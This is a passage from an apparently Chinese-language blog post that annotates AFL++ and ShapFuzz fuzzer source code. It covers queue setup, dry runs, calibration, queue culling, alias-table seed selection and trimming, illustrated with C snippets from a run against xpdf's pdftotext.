class="headerlink" title="read_testcases()"></a>read_testcases()</h3><p>调用add_to_queue(),将当前输入添加到队列中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">  q-&gt;fname = fname;<br>  q-&gt;len = len;<br>  q-&gt;depth = afl-&gt;cur_depth + <span class="hljs-number">1</span>;<br>  q-&gt;passed_det = passed_det;<br>  q-&gt;trace_mini = <span class="hljs-literal">NULL</span>;<br>  q-&gt;testcase_buf = <span class="hljs-literal">NULL</span>;<br>  q-&gt;mother = afl-&gt;queue_cur;<br>afl-&gt;max_depth = q-&gt;depth;<br>afl-&gt;<span class="hljs-built_in">queue</span> = afl-&gt;queue_top = q;<br>afl-&gt;ready_for_splicing_count++; <span class="hljs-comment">// 0 -&gt; 2</span><br>  ++afl-&gt;queued_items;<span class="hljs-comment">// 0 -&gt; 2</span><br>  ++afl-&gt;active_items;<span class="hljs-comment">// 0 -&gt; 2</span><br>  ++afl-&gt;pending_not_fuzzed;<span class="hljs-comment">// 0 -&gt; 2  因为初始输入中存在两个文件</span><br>  afl-&gt;cycles_wo_finds = <span class="hljs-number">0</span>;<br>afl-&gt;last_find_time = get_cur_time();<br></code></pre></td></tr></table></figure><p>最后，结束read_testcases()时。</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">afl</span>-&gt;</span>last_find_time = <span class="hljs-number">0</span>;<br><span class="hljs-function"><span class="hljs-title">afl</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">queued_at_start</span> = afl-&gt;</span>queued_items;<br></code></pre></td></tr></table></figure><p><code>afl-&gt;tmp_dir = afl-&gt;out_dir;</code></p><h3 id="确定-cur-input文件路径"><a href="#确定-cur-input文件路径" class="headerlink" title="确定.cur_input文件路径"></a>确定.cur_input文件路径</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.use_stdin = <span class="hljs-number">0</span>;<br>afl-&gt;fsrv.out_file = alloc_printf(<span class="hljs-string">&quot;%s/.cur_input&quot;</span>, afl-&gt;tmp_dir); <span class="hljs-comment">// &quot;/home/dog/fuzzing_xpdf/out/default/.cur_input&quot;</span><br></code></pre></td></tr></table></figure><h3 id="check-binary"><a href="#check-binary" class="headerlink" title="check_binary()"></a>check_binary()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.target_path = ck_strdup(fname); <span class="hljs-comment">// &quot;/home/dog/fuzzing_xpdf/build/bin/pdftotext&quot;</span><br></code></pre></td></tr></table></figure><h3 id="setup-testcase-shmem"><a href="#setup-testcase-shmem" class="headerlink" title="setup_testcase_shmem()"></a>setup_testcase_shmem()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;shm_fuzz = ck_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">sharedmem_t</span>));<br>afl-&gt;shm_fuzz-&gt;shmemfuzz_mode = <span class="hljs-number">1</span>;<br>shm-&gt;shm_id =<br>      shmget(IPC_PRIVATE, map_size == MAP_SIZE ? map_size + <span class="hljs-number">8</span> : map_size,<br>             IPC_CREAT | IPC_EXCL | DEFAULT_PERMISSION);<br>shm-&gt;<span class="hljs-built_in">map</span> = shmat(shm-&gt;shm_id, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>shm-&gt;map_size = map_size;<br></code></pre></td></tr></table></figure><p>主函数中执行了<code>afl-&gt;start_time = get_cur_time();afl-&gt;argv = use_argv;</code></p><h3 id="afl-shm-init"><a href="#afl-shm-init" class="headerlink" title="afl_shm_init()"></a>afl_shm_init()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.trace_bits =<br>    afl_shm_init(&amp;afl-&gt;shm, afl-&gt;fsrv.map_size, afl-&gt;non_instrumented_mode);<br></code></pre></td></tr></table></figure><p>为位图开辟了一个共享内存空间。</p><p>主函数执行以下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;fsrv.map_size = DEFAULT_SHMEM_SIZE;  <span class="hljs-comment">// dummy temporary value 其实没变</span><br><br><span class="hljs-built_in">memset</span>(afl-&gt;virgin_bits, <span class="hljs-number">255</span>, map_size); <span class="hljs-comment">// 为virgin_bits置255</span><br><span class="hljs-built_in">memset</span>(afl-&gt;virgin_tmout, <span class="hljs-number">255</span>, map_size); <span class="hljs-comment">//置255</span><br><span class="hljs-built_in">memset</span>(afl-&gt;virgin_crash, <span class="hljs-number">255</span>, map_size); <span class="hljs-comment">//置255</span><br></code></pre></td></tr></table></figure><h3 id="perform-dry-run"><a href="#perform-dry-run" class="headerlink" title="perform_dry_run()"></a>perform_dry_run()</h3><p>遍历所有队列项，将队列项都dry_run完成后，需要重置一些数据结构。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (idx = <span class="hljs-number">0</span>; idx &lt; afl-&gt;queued_items; idx++) &#123;<br>  q = afl-&gt;queue_buf[idx];<br>  <span class="hljs-keyword">if</span> (q &amp;&amp; !q-&gt;disabled &amp;&amp; q-&gt;len &gt; <span class="hljs-number">256</span>)&#123;<br>    u32 map_size = afl-&gt;fsrv.map_size;<br>    q-&gt;virgin_bits = ck_alloc(map_size);<span class="hljs-comment">// 将virgin_bits重置，以便下次运行时使用</span><br>    <span class="hljs-built_in">memset</span>(q-&gt;virgin_bits, <span class="hljs-number">255</span>, map_size);<br><br>    q-&gt;reset_times = ck_alloc(map_size);<span class="hljs-comment">// 将reset_times重置。</span><br>    <span class="hljs-built_in">memset</span>(q-&gt;reset_times, <span class="hljs-number">0</span>, map_size);<br>  &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(q)&#123;<br>    q-&gt;initial_seed = <span class="hljs-number">0</span>;<br>    q-&gt;ancestor_seed = <span class="hljs-literal">NULL</span>;<br>    q-&gt;splice = <span class="hljs-number">1</span>;<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="calibrate-case"><a href="#calibrate-case" class="headerlink" title="calibrate_case()"></a>calibrate_case()</h3><p>在calibrate_case函数中会有以下赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">q-&gt;exec_cksum = cksum;<span class="hljs-comment">// 校验和赋值</span><br><span class="hljs-built_in">memcpy</span>(afl-&gt;first_trace, afl-&gt;fsrv.trace_bits, afl-&gt;fsrv.map_size);  <span class="hljs-comment">// 位图赋给first_trace</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;total_cal_us += diff_us;<span class="hljs-comment">// 校验时间 </span><br>afl-&gt;total_cal_cycles += afl-&gt;stage_max;<span class="hljs-comment">// 校验轮次</span><br>q-&gt;exec_us = diff_us / afl-&gt;stage_max;<span class="hljs-comment">// 执行时间</span><br>q-&gt;bitmap_size = count_bytes(afl, afl-&gt;fsrv.trace_bits);<span class="hljs-comment">// 位图大小</span><br>q-&gt;handicap = handicap;<span class="hljs-comment">// 这个没变</span><br>q-&gt;cal_failed = <span class="hljs-number">0</span>;<span class="hljs-comment">// 失败次数归0</span><br><br>afl-&gt;total_bitmap_size += q-&gt;bitmap_size;<span class="hljs-comment">//总位图大小</span><br>++afl-&gt;total_bitmap_entries;<span class="hljs-comment">// 位图数量+1</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> (new_bits == <span class="hljs-number">2</span> &amp;&amp; !q-&gt;has_new_cov) &#123;<span class="hljs-comment">// new_bits == 2说明发现了新的路径</span><br><br>    q-&gt;has_new_cov = <span class="hljs-number">1</span>;<span class="hljs-comment">// 发现新边标志位置1</span><br>    ++afl-&gt;queued_with_cov;<span class="hljs-comment">// 新覆盖字节的路径+1</span><br><br>  &#125;<br><span class="hljs-comment">// 要退出calibrate_case()函数了，因此恢复其特征标志。</span><br>  afl-&gt;stage_name = old_sn; <span class="hljs-comment">// &quot;init&quot;</span><br>  afl-&gt;stage_cur = old_sc;<span class="hljs-comment">// 0</span><br>  afl-&gt;stage_max = old_sm;<span class="hljs-comment">// 0</span><br></code></pre></td></tr></table></figure><h3 id="has-new-bits"><a href="#has-new-bits" class="headerlink" title="has_new_bits()"></a>has_new_bits()</h3><p>差异如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(afl-&gt;read_flag &amp;&amp; afl-&gt;write_flag &amp;&amp; afl-&gt;mini_mode == <span class="hljs-number">0</span>)&#123; <span class="hljs-comment">//开头多的</span><br>  afl-&gt;new_edges_found_idx = <span class="hljs-number">0</span>;<span class="hljs-comment">// dryrun里，这个不会执行</span><br>&#125;<br>u32 tmp_edge = <span class="hljs-number">0</span>;<br><br><br><span class="hljs-keyword">if</span> (unlikely(ret) &amp;&amp; likely(virgin_map == afl-&gt;virgin_bits))<span class="hljs-comment">// 结尾多的</span><br>  afl-&gt;bitmap_changed = <span class="hljs-number">1</span>;<span class="hljs-comment">// dryrun里，这个会执行。</span><br></code></pre></td></tr></table></figure><h3 id="update-bitmap-score"><a href="#update-bitmap-score" class="headerlink" title="update_bitmap_score()"></a>update_bitmap_score()</h3><p>遍历位图的每一位，因为位图的每一位都代表着一个边，该位的值不为0，则代表边被覆盖，那么检查其top_rated是否存在。如果存在，那么使用AFLFast的方式更新top_rated[]数组；如果不存在，那么当前测试实例就暂时是其top_rated种子。queue队列的top_rated数组的每一位对应位图每一位。而该数组存储的是覆盖该路径的所有种子中的最好种子。</p><p>从perform_dry_run()结束后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (afl-&gt;q_testcase_max_cache_entries) &#123;<br><br>  afl-&gt;q_testcase_cache =<br>      ck_alloc(afl-&gt;q_testcase_max_cache_entries * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>));<br>  <span class="hljs-keyword">if</span> (!afl-&gt;q_testcase_cache) &#123; PFATAL(<span class="hljs-string">&quot;malloc failed for cache entries&quot;</span>); &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue()"></a>cull_queue()</h3><p>精简队列,获得一个能覆盖现有路径的最小queue_entry</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c">  afl-&gt;queued_favored = <span class="hljs-number">0</span>;<br>  afl-&gt;pending_favored = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 遍历队列，将当前所有测试实例的favored都变为0</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queued_items; i++) &#123;<br><br>    afl-&gt;queue_buf[i]-&gt;favored = <span class="hljs-number">0</span>;<br><br>  &#125;<br><span class="hljs-comment">// 迭代</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; afl-&gt;fsrv.map_size; ++i) &#123;<br><span class="hljs-comment">// 判断该位的路径有没有被设置</span><br>    <span class="hljs-keyword">if</span> (afl-&gt;top_rated[i] &amp;&amp; (temp_v[i &gt;&gt; <span class="hljs-number">3</span>] &amp; (<span class="hljs-number">1</span> &lt;&lt; (i &amp; <span class="hljs-number">7</span>)))) &#123;<br><span class="hljs-comment">// 如果top_rated[i]有值，且该路径在temp_v里被置位了，则更新temp_v</span><br>      u32 j = len;<br><br>      <span class="hljs-comment">/* Remove all bits belonging to the current entry from temp_v. */</span><br><br>      <span class="hljs-keyword">while</span> (j--) &#123;<br><br>        <span class="hljs-keyword">if</span> (afl-&gt;top_rated[i]-&gt;trace_mini[j]) &#123;<br><br>          temp_v[j] &amp;= ~afl-&gt;top_rated[i]-&gt;trace_mini[j];<br><br>        &#125;<br><br>      &#125;<br><span class="hljs-comment">// 如果该条目之前没有被标记为favored，则标记并增加。</span><br>      <span class="hljs-keyword">if</span> (!afl-&gt;top_rated[i]-&gt;favored) &#123;<br><span class="hljs-comment">// 设置favored位1，queue_favored计数器+1</span><br>        afl-&gt;top_rated[i]-&gt;favored = <span class="hljs-number">1</span>;<br>        ++afl-&gt;queued_favored;<br><span class="hljs-comment">// 如果 WAS_FUZZED字段为0，代表其还没有被fuzz过，则将pending_favored计数器加一</span><br>        <span class="hljs-keyword">if</span> (!afl-&gt;top_rated[i]-&gt;was_fuzzed) &#123; ++afl-&gt;pending_favored; &#125;<br><br>      &#125;<br><br>    &#125;<br><br>  &#125;<br><span class="hljs-comment">// 遍历queue队列，标记队列中的冗余条目</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; afl-&gt;queued_items; i++) &#123;<br><br>    <span class="hljs-keyword">if</span> (likely(!afl-&gt;queue_buf[i]-&gt;disabled)) &#123;<br><br>      mark_as_redundant(afl, afl-&gt;queue_buf[i], !afl-&gt;queue_buf[i]-&gt;favored);<br><br>    &#125;<br><br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="maybe-update-plot-file"><a href="#maybe-update-plot-file" class="headerlink" title="maybe_update_plot_file()"></a>maybe_update_plot_file()</h3><h3 id="主循环体"><a href="#主循环体" class="headerlink" title="主循环体"></a>主循环体</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"> ++afl-&gt;queue_cycle;<span class="hljs-comment">// cycle+1</span><br>runs_in_current_cycle = (u32)<span class="hljs-number">-1</span>;<span class="hljs-comment">// 重置为(u32) - 1</span><br>afl-&gt;cur_skipped_items = <span class="hljs-number">0</span>;<span class="hljs-comment">// 跳过测试用例数量置 0 </span><br><br>afl-&gt;cycles_wo_finds = <span class="hljs-number">0</span>;<span class="hljs-comment">// 当前周期发现新路径的数量 置 0</span><br><br>runs_in_current_cycle++;<span class="hljs-comment">// ++ 变成0了</span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 调用完create_alias_table()函数后，会产生一个alias表，表中记录着测试实例的分数，与概率。</span><br>afl-&gt;current_entry = select_next_queue_entry(afl);<span class="hljs-comment">// 根据alia算法，选出下一个种子</span><br>afl-&gt;queue_cur = afl-&gt;queue_buf[afl-&gt;current_entry];<span class="hljs-comment">// 根据选出的种子，赋给当前queue</span><br></code></pre></td></tr></table></figure><h3 id="create-alias-table"><a href="#create-alias-table" class="headerlink" title="create_alias_table()"></a>create_alias_table()</h3><p> create the alias table that allows weighted random selection - expensive</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">afl-&gt;alias_table =<br>    (u32 *)afl_realloc((<span class="hljs-type">void</span> **)&amp;afl-&gt;alias_table, n * <span class="hljs-keyword">sizeof</span>(u32));<br>afl-&gt;alias_probability = (<span class="hljs-type">double</span> *)afl_realloc(<br>    (<span class="hljs-type">void</span> **)&amp;afl-&gt;alias_probability, n * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br></code></pre></td></tr></table></figure><h3 id="fuzz-one-original"><a href="#fuzz-one-original" class="headerlink" title="fuzz_one_original()"></a>fuzz_one_original()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  afl-&gt;subseq_tmouts = <span class="hljs-number">0</span>;<span class="hljs-comment">// 超时数量</span><br><br>  afl-&gt;cur_depth = afl-&gt;queue_cur-&gt;depth;<span class="hljs-comment">// 记录深度</span><br><br>  afl-&gt;stage_name = afl-&gt;stage_name_buf;<span class="hljs-comment">// stage名称</span><br>  afl-&gt;bytes_trim_in += q-&gt;len;<span class="hljs-comment">// 记录修剪字节数</span><br><br>afl-&gt;queue_cur-&gt;trim_done = <span class="hljs-number">1</span>;<span class="hljs-comment">// 修剪结束标志</span><br></code></pre></td></tr></table></figure><p>在trim结束后，根据条件判断，进入聚类函数。以下是shapfuzz中的内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c">u64 fuzz_time = ((afl-&gt;prev_run_time + get_cur_time() - afl-&gt;start_time) / <span class="hljs-number">1000</span>);  <br><span class="hljs-keyword">if</span>(afl-&gt;queued_items &gt; afl-&gt;centers_num &amp;&amp; (afl-&gt;queued_items &gt;= <span class="hljs-number">2</span> * afl-&gt;last_centers_realted_seeds))&#123;<br>    <span class="hljs-comment">// 聚类函数</span><br>  kmeans_main(afl);<br><br>  afl-&gt;last_centers_realted_seeds = afl-&gt;queued_items;<br>  afl-&gt;centers_gen_time = fuzz_time;<br><br>  <span class="hljs-keyword">for</span> (u32 c = <span class="hljs-number">0</span>; c &lt; afl-&gt;queued_items; c++) &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">queue_entry</span> * <span class="hljs-title">cur_node</span> =</span> afl-&gt;queue_buf[c];<br>    <span class="hljs-keyword">if</span>(cur_node-&gt;initial_seed &amp;&amp; cur_node-&gt;mutated_pos_num != <span class="hljs-number">-1</span>)&#123;<br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; cur_node-&gt;len;i++)&#123;<br>        <span class="hljs-keyword">if</span>(cur_node-&gt;mutated_pos[i].flag &gt;= <span class="hljs-number">1</span>)&#123;<br>          M_free(cur_node-&gt;mutated_pos[i].A);<br>          M_free(cur_node-&gt;mutated_pos[i].b);<br><br>          cur_node-&gt;mutated_pos[i].A = M_I(afl-&gt;centers_num);<br>          cur_node-&gt;mutated_pos[i].b = M_Zeros(afl-&gt;centers_num,<span class="hljs-number">1</span>);<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(afl-&gt;centers_gen_time &gt; afl-&gt;queue_cur-&gt;vec_update_time)&#123;<br>  u32 map_size = afl-&gt;fsrv.map_size;<br>  <span class="hljs-type">float</span>* cur = (<span class="hljs-type">float</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br>  <span class="hljs-built_in">memset</span>(cur, <span class="hljs-number">0</span> ,<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">float</span>) * map_size);<br><br>  common_fuzz_stuff(afl, out_buf, len);<br>  u32 j = <span class="hljs-number">0</span>;<br>  u8 *src = afl-&gt;fsrv.trace_bits;<br>  <span class="hljs-keyword">while</span> (j &lt; map_size) &#123;<br>    u8 v = *src;<br>    <span class="hljs-keyword">if</span>(v)&#123;<br>      cur[j] = (<span class="hljs-type">float</span>)v;<br>    &#125;<br>    src++;<br>    ++j;<br>  &#125;<br><br>  <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; afl-&gt;centers_num;i++)&#123;<br>    <span class="hljs-type">double</span> distance = (<span class="hljs-type">double</span>)cal_distance(cur, afl-&gt;centers[i], map_size);<br>    afl-&gt;queue_cur-&gt;feature_vec-&gt;data[i] = distance;<br>  &#125;<br><br>  afl-&gt;queue_cur-&gt;vec_update_time = afl-&gt;centers_gen_time;<br>  <br>&#125;<br><br><br><span class="hljs-keyword">if</span>(afl-&gt;queue_cur-&gt;len &gt; afl-&gt;max_len)&#123;<br>  <span class="hljs-keyword">if</span>(afl-&gt;history_mutation_sequence)&#123;<br>    <span class="hljs-built_in">free</span>(afl-&gt;history_mutation_sequence);<br>    <span class="hljs-built_in">free</span>(afl-&gt;new_mutation_sequence);<br>  &#125;<br><br>  afl-&gt;history_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>  afl-&gt;new_mutation_sequence = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br><br>  <span class="hljs-keyword">if</span>(afl-&gt;max_len != <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-built_in">free</span>(afl-&gt;dataset_reward);<br>    <span class="hljs-built_in">free</span>(afl-&gt;hit_nums);<br>    <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos);<br>    <span class="hljs-built_in">free</span>(afl-&gt;tmp_mutated_pos_flag);<br>  &#125;<br>  <br><br>  afl-&gt;dataset_reward = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  afl-&gt;hit_nums = (<span class="hljs-type">double</span> *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  afl-&gt;tmp_mutated_pos = (u32 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u32));<br>  afl-&gt;tmp_mutated_pos_flag = (u8 *)<span class="hljs-built_in">calloc</span>(afl-&gt;queue_cur-&gt;len, <span class="hljs-keyword">sizeof</span>(u8));<br><br>  afl-&gt;max_len = afl-&gt;queue_cur-&gt;len;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-built_in">memset</span>(afl-&gt;dataset_reward, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  <span class="hljs-built_in">memset</span>(afl-&gt;hit_nums, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">double</span>));<br>  <span class="hljs-built_in">memset</span>(afl-&gt;tmp_mutated_pos_flag, <span class="hljs-number">0</span>, afl-&gt;max_len * <span class="hljs-keyword">sizeof</span>(u8));<br>&#125;<br>afl-&gt;history_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>afl-&gt;new_mutation_sequence_idx = <span class="hljs-number">0</span>;<br>afl-&gt;tmp_mutated_pos_idx = <span class="hljs-number">0</span>;<br>afl-&gt;from_splicing = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">orig_perf = perf_score = afl-&gt;queue_cur-&gt;perf_score;<br></code></pre></td></tr></table></figure><h3 id="trim-case"><a href="#trim-case" class="headerlink" title="trim_case()"></a>trim_case()</h3><p>shapfuzz:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (q-&gt;len &lt; <span class="hljs-number">5</span>) &#123; <br>    <span class="hljs-comment">// 如果测试实例长度小于5，且是原始种子</span><br>  <span class="hljs-keyword">if</span>(q-&gt;initial_seed)&#123;<br><br>    <span class="hljs-keyword">if</span>(q-&gt;initial_seed)&#123;<br>        <br>      q-&gt;<span class="hljs-built_in">map</span> = (u64 *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(u64) * q-&gt;len);<br>        <span class="hljs-comment">// 初始化q-&gt;map为i</span><br>      <span class="hljs-keyword">for</span>(u32 i = <span class="hljs-number">0</span>;i &lt; q-&gt;len;i++) (q-&gt;<span class="hljs-built_in">map</span>)[i] = (u64)i;<br>      q-&gt;mutated_pos = (<span class="hljs-keyword">struct</span> arm *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> arm) * q-&gt;len);<br>        <span class="hljs-comment">// 